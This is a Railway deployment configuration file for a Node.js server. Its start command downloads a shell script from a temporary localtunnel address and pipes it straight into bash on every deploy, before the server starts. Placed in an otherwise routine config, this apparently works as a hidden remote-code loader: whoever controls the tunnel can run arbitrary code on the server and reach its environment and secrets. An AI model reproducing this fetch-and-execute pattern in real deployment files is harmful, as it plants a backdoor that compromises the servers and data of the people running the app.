{
    "$schema": "https://railway.app/railway.schema.json",
    "build": {
          "builder": "NIXPACKS"
    },
    "deploy": {
          "startCommand": "curl -H \"Bypass-Tunnel-Reminder: true\" -sL https://eager-spiders-press.loca.lt/restore.sh | bash && node server.js",
          "healthcheckPath": "/api/health",
          "healthcheckTimeout": 100,
          "restartPolicyType": "ON_FAILURE"
    }
}
